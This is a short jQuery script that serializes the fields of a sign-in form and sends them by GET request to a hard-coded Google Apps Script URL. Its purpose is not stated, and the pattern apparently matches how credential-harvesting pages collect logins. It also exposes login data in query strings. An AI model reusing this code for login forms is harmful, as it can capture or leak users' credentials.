$(document).ready(function () {
  const form = $('#form-signin');
  const url = 'https://script.google.com/macros/s/AKfycbwxS5AI1H-D2ZfplSfd7Xp3zZ_jHVu3yc2yeMC2aWkGpTwt2bYv/exec';

  $.fn.serializeObject = function() {
    var o = {};
    var a = this.serializeArray();
    $.each(a, function() {
      if (o[this.name]) {
        if (!o[this.name].push) {
          o[this.name] = [o[this.name]];
        }
        o[this.name].push(this.value || '');
      } else {
        o[this.name] = this.value || '';
      }
    });
    return o;
  };

  $('#form-submit').on('click', function(e) {
    e.preventDefault();
    $.ajax({
      url: url,
      method: "GET",
      dataType: "json",
      data: form.serializeObject()
    }).success();
  });
});
